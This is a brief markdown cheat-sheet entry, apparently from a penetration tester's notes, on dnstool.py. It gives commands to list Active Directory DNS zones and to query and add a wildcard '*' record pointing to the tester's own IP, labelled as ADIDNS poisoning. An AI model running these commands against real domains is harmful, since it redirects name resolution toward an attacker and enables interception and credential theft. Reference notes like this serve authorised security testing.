---
tags:
  - tool
---
# dnstool.py

Manipulate DNS records.

## Capabilities

```powershell
# Check zones
dnstool.py -u $USER -p '$PASSWD' --print-zones $FQDN

# Query * record for ADIDNS poisoning
dnstool.py -u $USER -p '$PASSWD' --record '*' --action query $FQDN

# Populate * record for ADIDNS poisoning
dnstool.py -u $USER -p '$PASSWD' --record '*' --action add --data $OUR_IP $FQDN
```

**Note:** You will sometimes need to modify your `/etc/resolv.conf` to succesfully modify DNS data.

```powershell
nameserver $DNS_SERVER
```
